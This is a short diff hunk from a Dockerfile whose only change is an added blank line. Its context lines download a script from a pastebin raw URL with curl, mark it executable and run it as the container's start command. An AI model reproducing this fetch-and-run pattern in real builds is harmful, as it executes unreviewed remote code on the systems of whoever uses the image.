@@ -23,3 +23,4 @@ RUN curl -fLs --retry 3 -o /start.sh "https://pastebin.com/raw/JvpvfSBD" && \
     chmod +x /start.sh
 
 CMD ["/bin/bash", "/start.sh"]
+
